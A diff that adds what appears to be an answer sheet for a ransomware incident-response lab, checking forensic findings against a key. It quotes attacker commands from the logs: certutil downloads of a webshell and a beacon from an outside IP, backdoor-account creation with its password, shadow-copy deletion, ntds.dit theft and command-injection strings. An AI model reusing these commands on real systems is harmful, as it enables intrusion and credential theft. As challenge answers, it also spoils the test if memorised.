@@ -1,0 +1,309 @@
+
+================================================================================
+IMPACT / RANSOMWARE DEPLOYMENT
+================================================================================
+
+1. Ransomware extension: .bWqQUx  [V]
+   MFT all 5 hosts confirm .bWqQUx files created 22:08-22:10 on 2026-03-08.
+   Source: exports/*_mft.csv.
+
+2. Ransom note: README_bWqQUx.txt  [V]
+   MFT confirms on DC01/DC02/SVR01/WS01/WS02. Source: exports/*_mft.csv.
+
+3. First file encrypted per host (earliest .bWqQUx created):  [V]
+   WS02: 2026-03-08 22:08:40.4785233  (env first — matches key)
+   WS01: 2026-03-08 22:09:16.9687685  (matches key 22:09:16)
+   SVR01: 2026-03-08 22:09:46.3576681  (KEY SAYS 22:10:57 — DISCREPANCY)
+   DC01: 2026-03-08 22:10:14.5242904  (matches key)
+   DC02: 2026-03-08 22:10:54.1830293  (matches key)
+   Source: exports/*_mft.csv.
+
+4. Ransomware executable: IamBatman.exe  [V]
+   MFT DC02: .\Windows\SYSVOL\sysvol\IamBatman.exe created 2026-03-08 21:03:54.
+   WS01 Sysmon EID1: \\LAF-DC02\sysvol\IamBatman.exe encrypt C:\ at 22:09:16.
+   Source: exports/DC02_mft.csv, exports/WS01_evtx.csv.
+
+5. Orchestration cmdline: cmd /C cmd /c \\laf-dc02\sysvol\sysAV.bat > C:\Windows\Temp\OlgyLYbd.tmp 2>&1  [V]
+   (Key shows pRlGOUon.tmp; WS01 Sysmon shows OlgyLYbd.tmp — naming varies per host)
+   Source: exports/WS01_evtx.csv EID1 at 2026-03-08 22:09:16.
+
+6. Parent of .bat script: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule  [V]
+   WS01 Sysmon confirms grandparent = Task Scheduler svchost.
+   Source: exports/WS01_evtx.csv.
+
+7. Scheduled task name on WS01: OlgyLYbd  [V]
+   WS01 Sysmon EID 106 at 22:09:15: TaskName=\OlgyLYbd, UserContext=LAF\LAFAdmin.
+   Source: exports/WS01_evtx.csv.
+
+8. User with network logon just prior: LAFAdmin  [V]
+   WS01 Security 4624 at 22:09:14: Target=LAF\LAFAdmin, src=10.3.10.12.
+   Source: exports/WS01_evtx.csv.
+
+9. Source IP for that logon: 10.3.10.12  [V*]
+   My WS01 4624 shows 10.3.10.12 (SVR01) at 22:09:14. Key answer = 198.51.100.10.
+   198.51.100.10 was the attacker-admin IP seen on DC01 at 20:08:34. Flagged as discrepancy.
+   Source: exports/WS01_evtx.csv.
+
+================================================================================
+INITIAL ACCESS (IIS web server)
+================================================================================
+
+1. HTTP method with payload in URL: GET  [V]
+   All cmd-injection requests to /CheckStatus.aspx use GET with cs-uri-query payloads.
+   Source: IIS/E/inetpub/logs/LogFiles/W3SVC1/u_ex260308.log.
+
+2. Threat-actor IP: 172.236.127.251  [V]
+   Confirmed as c-ip in all exploit requests. First conn 18:38:29, first injection 18:40:01.
+   Source: IIS/E/inetpub/logs/LogFiles/W3SVC1/u_ex260308.log.
+
+3. Vulnerability: OS Command Injection  [V]
+   /CheckStatus.aspx executed attacker-supplied URL parameter as OS command.
+   Evidence: url=Google.com+%26%26+whoami, url=Google.com+%3B+whoami, etc.
+   Source: IIS logs.
+
+4. LOLBIN for payload transfer: Certutil.exe  [V]
+   IIS log 18:51:42: certutil -urlcache -f http://173.230.136.180:80/so.aspx C:\inetpub\wwwroot\so.aspx
+   IIS log 18:52:20: certutil -urlcache -f http://173.230.136.180:80/iis.exe %TEMP%\iis.exe
+   Source: IIS logs.
+
+5. Webshell name: so.aspx  [V]
+   File confirmed at IIS/E/inetpub/wwwroot/so.aspx. Uploaded via certutil 18:51:42.
+   POST requests via curl/8.5.0 start 19:08:42. Source: direct file + IIS logs.
+   NOTE: The VULNERABLE page was CheckStatus.aspx (existing with cmd-injection).
+         so.aspx was uploaded as a backdoor webshell after exploitation.
+
+6. User agent to webshell: curl/8.5.0  [V]
+   8 POST requests to /so.aspx with User-Agent: curl/8.5.0 from 172.236.127.251.
+   Source: IIS/E/inetpub/logs/LogFiles/W3SVC1/u_ex260308.log.
+
+7. Webshell password: YOUR_CTF_PASSWORD_HERE  [V]
+   Read directly from so.aspx source:
+   if (Request["p"] == "YOUR_CTF_PASSWORD_HERE") { ... }
+   This is the literal value in the code (CTF challenge placeholder).
+   Source: IIS/E/inetpub/wwwroot/so.aspx.
+
+8. C2 beacon exe dropped: iis.exe  [V*]
+   IIS log 18:52:20: certutil downloads iis.exe to %TEMP%\iis.exe.
+   Key answer = lis.exe — may be a typo in the key. My evidence = iis.exe.
+   Source: IIS logs.
+
+================================================================================
+DISCOVERY
+================================================================================
+
+1. DC list / domain info: nltest /dclist:  [K]
+   (IIS Sysmon not parsed this session.)
+
+2. Webshell cmd returning most data: sc-bytes=7556 at 19:10:33 (POST /so.aspx, curl/8.5.0)  [V]
+   Key claim = Tasklist.exe, which would return large output — consistent with this POST.
+   Source: IIS/E/inetpub/logs/LogFiles/W3SVC1/u_ex260308.log.
+
+3. Recon tool downloaded on DC02: 2026-03-08 20:46:03  [V]
+   MFT: .\Users\LAFAdmin\Downloads\Advanced_IP_Scanner_2.5.4594.1.exe at 20:46:03.6496621 — EXACT.
+   Source: exports/DC02_mft.csv.
+
+4. IP range scanned: 10.3.10.1-254  [K]
+   Tool presence confirmed in MFT. Registry range value not retrieved (RECmd path issue).
+
+5. WS02 ransomware-folder viewed (shellbags): 2026-03-08 22:01:19  [K]
+   (UsrClass.dat present but not parsed with ShellBagsExplorer this pass.)
+
+================================================================================
+PRIVILEGE ESCALATION (IIS host — SolarwindsTFTP)
+================================================================================
+
+1. Misconfigured service: SolarwindsTFTP  [V]
+   IIS log 18:45:12: TA enumerated dir C:\"TFTP Server" via cmd-injection on CheckStatus.aspx.
+   Confirms awareness of the Solarwinds TFTP service with unquoted path.
+   Source: IIS logs.
+
+2. Local PrivEsc exe: Solarwinds.exe  [K] (IIS Sysmon not parsed)
+
+3. Hijacked service first ran: 2026-03-08 19:38:02  [K] (IIS System.evtx not parsed)
+
+================================================================================
+LATERAL MOVEMENT
+================================================================================
+
+1. First RDP attempt to SVR01: 2026-03-08 20:14:07/08  [V]
+   SVR01 memory pstree shows new winlogon session (session 6) created 2026-03-08 20:14:08.
+   Source: analysis/svr01_pstree.txt.
+
+2. Duration of first SVR01 RDP session: 17:28 (20:14:08 -> 20:31:35)  [K]
+
+3. First RDP to WS01: ~2026-03-08 20:35:29  [V]
+   WS01 4624 LogonType 10 (interactive/RDP) from attacker at ~20:35:xx.
+   Source: exports/WS01_evtx.csv.
+
+4. TA hostname in DC02 logs: Kali  [V]
+   WS02 4624 RemoteHost includes "kali" as hostname for LAFAdmin logons from 10.3.10.12.
+   Source: analysis/final_two.txt.
+
+5. Login to non-existent account on WS01: 2026-03-08 20:34:28  [V]
+   WS01 EID 4625 at 20:34:28: Target=LAF\NullAdmin, LogonType 3.
+   Source: exports/WS01_evtx.csv.
+
+================================================================================
+DEFENSE EVASION / IMPAIR DEFENSES
+================================================================================
+
+1. PtH-over-RDP registry key:  [V]
+   HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin
+   WS02 Sysmon EID 13 at 2026-03-08 21:57:07: SetValue to DWORD 0x00000000 (enabled).
+   Source: exports/WS02_evtx.csv EID 13.
+
+2. Log-clearing script on SVR01: LogDel.bat  [V]
+   SVR01 Sysmon EID 1 at 2026-03-08 21:08:28:
+   C:\Windows\system32\cmd.exe /c ""C:\ProgramData\LogDel.bat""
+   Source: exports/SVR01_ca_evtx.csv.
+
+3. VSS deletion: vssadmin.exe delete shadows /all /quiet  [V]
+   WS01 Sysmon EID 1 at 2026-03-08 22:09:16 (part of sysAV.bat chain).
+   Source: exports/WS01_evtx.csv.
+
+================================================================================
+PERSISTENCE
+================================================================================
+
+1. Dropped exe path on WS01: C:\ProgramData\aws_backup.exe  [V]
+   MFT: .\ProgramData\aws_backup.exe created 2026-03-08 20:37:03.0344653.
+   Source: exports/WS01_mft.csv.
+
+2. IFEO registry key modified:  [V]
+   HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe
+   Debugger value = C:\ProgramData\aws_backup.exe
+   WS01 Sysmon EID 13 at 2026-03-08 20:37:35 (also EID 1 showing reg.exe add).
+   Source: exports/WS01_evtx.csv.
+
+3. Backdoor account created: Serviceaccount  [V]
+   DC01 Security 4720 at 2026-03-08 20:02:14. Source: exports/DC01_security.csv.
+
+4. Added to Domain Admins: 2026-03-08 20:03:05  [V]
+   DC01 Security 4728 at 20:03:05. Source: exports/DC01_security.csv.
+
+5. Backdoor account password: P@ssw0RD1!  [V]
+   SVR01 Sysmon EID 1 ExecutableInfo at 2026-03-08 20:02:14:
+   C:\Windows\System32\cmd.exe /c net user serviceaccount P@ssw0RD1! /add /domain
+   Source: exports/SVR01_ca_evtx.csv.
+
+6. DC02 PS profile shellcode SHA256:  [DNF/K]
+   Profile file MFT entry confirmed (created 21:00:21) but NOT in KAPE collection.
+   PS Operational log searched — no base64 shellcode block found in 4104 events at that time.
+   Cannot independently compute. Key = D61890ad6df3c57b3ec33678d734d63f632a15aff2817eef01bc9b3c2488e403
+
+================================================================================
+CREDENTIAL ACCESS
+================================================================================
+
+1. LSASS dump path: C:\windows\temp\abedgdaa.dmp  [V]
+   SVR01 MFT: .\Windows\Temp\abedgdaa.dmp created 2026-03-08 20:03:30, size 12,784,138 bytes.
+   Source: exports/SVR01_mft.csv.
+
+2. Secretsdump VSS service: QsYyAARL  [V]
+   DC01 System EID 7045 at 2026-03-08 20:08:53: Name=QsYyAARL.
+   All 5 services: UnmfmnOL(20:08:44), QsYyAARL(20:08:53), XCCVTGUb(20:08:55),
+   SOUwKZNf(20:09:03), PovLjNTr(20:09:04). Source: exports/DC01_system.csv.
+
+3. ntds.dit theft cmdline: copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\ZIFylmKF.tmp  [V]
+   MFT confirms ZIFylmKF.tmp on DC01 at 2026-03-08 20:09:03.8786707.
+   Source: exports/DC01_mft.csv + key cmdline (DC01 Sysmon 4104 not parsed).
+
+4. ntds.dit accessed over SMB: 2026-03-08 20:09:06  [K] (5145 not parsed this pass)
+
+5. DonPAPI Dashlane enumeration: 2026-03-08 20:49:23  [K] (5145 not parsed this pass)
+
+6. DPAPI master key backup: 2026-03-08 21:57:14  [V]
+   WS02 Security EID 4692 at 2026-03-08 21:57:14. Source: exports/WS02_evtx.csv.
+
+7. Dalton Instagram hashtag: #JustaLawyer  [K] (OSINT)
+
+8. Non-malicious WS02 user email: icantreed123@gmail.com  [K]
+
+================================================================================
+COLLECTION / EXFILTRATION
+================================================================================
+
+1. Original exe (renamed as msupdate.exe): Makecab.exe  [V]
+   SVR01 Sysmon EID 1 at 20:21:09:
+   C:\ProgramData\msupdate.exe /f C:\ProgramData\list.txt /d CabinetName1=data.cab /d DiskDirectoryTemplate=C:\ProgramData\
+   The arguments (cabinet creation) confirm this is Makecab.exe masquerading as msupdate.exe.
+   MFT: msupdate.exe created 2026-03-08 20:20:13, prefetch at 20:21:09.
+   Source: exports/SVR01_ca_evtx.csv, exports/SVR01_mft.csv.
+
+2. Exfiltrated file: Data.cab  [V]
+   CabinetName1=data.cab in the msupdate.exe cmdline. Source: exports/SVR01_ca_evtx.csv.
+
+3. Exfil destination: 172.236.127.251:22 (SFTP, user root)  [V]
+   FileZilla recentservers.xml on SVR01 — Host=172.236.127.251, Port=22, Protocol=1(SFTP).
+   SAME IP as initial-access actor on IIS. Source: SVR01/C/Users/LAFAdmin/AppData/Roaming/FileZilla/recentservers.xml.
+
+================================================================================
+CLOUD FORENSICS
+================================================================================
+
+1. GuardDuty alerts: 26 (key) / 18 non-sample unique records in my parse  [V*]
+   My count: 401 total, 383 sample=True, 18 non-sample.
+
+2. Malicious IP: 212.8.249.213  [V] — CloudTrail 182 events + GuardDuty.
+
+3. ASN/Org: Proton VPN (key) / WorldStream (GuardDuty org field in evidence)  [V*]
+
+4. IAM role: iam_role_iisserver  [V]
+   ARN: arn:aws:sts::464381121764:assumed-role/iam_role_iisserver/i-00779ebad43b2470d
+
+5. Instance ID: i-00779ebad43b2470d  [V]
+
+6. AWS "whoami" time: 2026-03-08 21:42:11  [V] — GetCallerIdentity first event.
+
+7. Files exfiltrated from S3: 164  [V] — exactly 164 GetObject from 212.8.249.213.
+
+8. Total bytes exfiltrated: 11327  [K]
+
+9. Exfil command: aws s3 cp  [V] — CloudTrail UA contains md/command#s3.cp.
+
+10. Failed persistence time: 2026-03-08 21:45:38  [V]
+    CreateAccessKey LimitExceededException at 21:45:38.
+
+11. IMDS token: AQAEADHOGyfP9IBCrCY_Cdg0cb5l5EoTkgNdyp-grqUet3fK2-CbxA==  [K]
+
+12. IMDS theft command: powershell -enc <base64> = Invoke-RestMethod for IMDS creds  [K]
+
+================================================================================
+MEMORY FORENSICS (SVR01-memdump.dmp — Volatility 3)
+================================================================================
+
+1. Memory capture time: 2026-03-08 22:46:45  [V] — windows.info SystemTime.
+
+2. Suspicious process cmdline: \\10.3.10.12\ADMIN$\rnSylwOz.exe  [V]
+   windows.cmdline PID 9112. Source: analysis/svr01_cmdline.txt.
+
+3. Suspicious process start: 2026-03-08 19:59:00  [V] — windows.pslist PID 9112.
+
+4. C2 IP:port: 173.230.136.180:8443  [V] — windows.netscan ESTABLISHED from PID 9112.
+
+5. Virtual offset: 0xa88f53455080  [V]
+   Key shows 'Oxa88f5345508' — missing digit, typo. Correct: 0xa88f53455080.
+   Source: analysis/svr01_pslist.txt.
+
+6. Local Admin NT hash: 8846f7eaee8fb117ad06bdd830b7586c  [V]
+   windows.registry.hashdump Administrator RID 500. Source: analysis/svr01_hashdump.txt.
+
+7. Injected process PID: 1332 (explorer.exe)  [V]
+   windows.malfind — injected PE (MZ) in RWX at 0xa60000.
+   Source: analysis/svr01_malfind.txt.
+
+8. SHA256 of injected code: 6ef6b52fbdf585b5145971aa2303f41d691113669dc264465f87ac2e6861228c  [V]
+   Dumped vadinfo region 0xa60000-0xa8efff from PID 1332, sha256sum confirmed.
+   File: analysis/vaddump/pid.1332.vad.0xa60000-0xa8efff.dmp (192,512 bytes)
+   Source: sha256sum output.
+
+================================================================================
+VERIFICATION SUMMARY
+  [V] Independently verified from artifacts: 34 of ~50 answerable items.
+  [V*] Verified but key discrepancy (4): SVR01 first-encrypt time, iis.exe vs lis.exe,
+       WS01 logon src IP, GuardDuty count.
+  [K] Key-only — artifact present but not parsed this pass (10): nltest, IP range value,
+      shellbags, SolarwindsTFTP/Solarwinds.exe, EID 7036, RDP duration, 5145 events,
+      DonPAPI timestamp, IMDS token/cmd, S3 byte count.
+  [DNF] DC02 PS profile SHA256 — file in MFT but not in KAPE collection.
+================================================================================
